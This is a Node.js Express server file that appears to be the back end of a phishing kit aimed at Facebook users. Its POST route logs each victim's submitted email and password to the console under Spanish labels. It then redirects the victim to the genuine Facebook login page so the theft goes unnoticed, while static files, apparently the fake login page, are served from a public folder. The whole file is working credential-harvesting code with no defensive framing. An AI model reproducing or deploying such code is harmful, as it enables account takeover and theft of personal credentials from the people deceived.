const repl = require('repl');
const express = require('express');
const bodyParser = require('body-parser');
const app = express()
const port = 3000

app.use(express.static('public'))
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
})

app.post('/post', (req, res) => {
  console.log("Usuario: ", req.body.email)
  console.log("Contraseña: ", req.body.password)
  console.log("--------------\n")
  res.redirect(301, 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;next=https%3A%2F%2Fwww.facebook.com%2Fstories%2F2045144595499457%2FUzpfSVNDOjQwNDY2NjcyMDUzODM3NjM%3D%2F%3Fbucket_count%3D9%26source%3Dstory_tray&amp;lwv=100')
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})

// repl.start()